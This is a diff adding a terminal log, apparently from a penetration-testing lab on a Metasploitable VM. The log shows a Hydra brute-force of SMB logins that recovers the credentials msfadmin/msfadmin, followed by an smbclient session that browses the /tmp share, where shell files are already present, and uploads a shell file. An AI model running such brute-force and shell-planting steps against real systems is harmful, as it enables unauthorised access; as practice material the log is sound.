@@ -1,0 +1,60 @@
+hydra -L username.txt -P passwd.txt smb://192.168.0.103
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-20 16:25:01
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 308 login tries (l:14/p:22), ~308 tries per task
+[DATA] attacking smb://192.168.0.103:445/
+[445][smb] host: 192.168.0.103   login: msfadmin   password: msfadmin
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+[445][smb] Host: 192.168.0.103 Account:  Error: Invalid account (Anonymous success)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-20 16:25:30
+                                                                                     
+smbclient //192.168.0.103/tmp -U msfadmin
+Password for [WORKGROUP\msfadmin]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Jan 20 18:09:06 2025
+  ..                                 DR        0  Mon May 21 01:36:12 2012
+  shell3.php                          A       68  Mon Jan 20 17:58:30 2025
+  shell.elf                           A      152  Mon Jan 20 17:20:36 2025
+  .ICE-unix                          DH        0  Mon Jan 20 15:33:42 2025
+  orbit-msfadmin                      D        0  Mon Jan 20 17:25:32 2025
+  .X11-unix                          DH        0  Mon Jan 20 15:33:55 2025
+  .X0-lock                           HR       11  Mon Jan 20 15:33:55 2025
+  passwd.txt                         AR      173  Mon Jan 20 16:46:48 2025
+  4791.jsvc_up                        R        0  Mon Jan 20 15:34:34 2025
+  gconfd-msfadmin                     D        0  Mon Jan 20 17:25:32 2025
+
+                7282168 blocks of size 1024. 5425468 blocks available
+smb: \> cd gconfd-msfadmin
+smb: \gconfd-msfadmin\> ls
+  .                                   D        0  Mon Jan 20 17:25:32 2025
+  ..                                  D        0  Mon Jan 20 18:09:06 2025
+
+                7282168 blocks of size 1024. 5425468 blocks available
+smb: \gconfd-msfadmin\> put shell.txt
+putting file shell.txt as \gconfd-msfadmin\shell.txt (45.5 kb/s) (average 45.5 kb/s)
+smb: \gconfd-msfadmin\> 
+
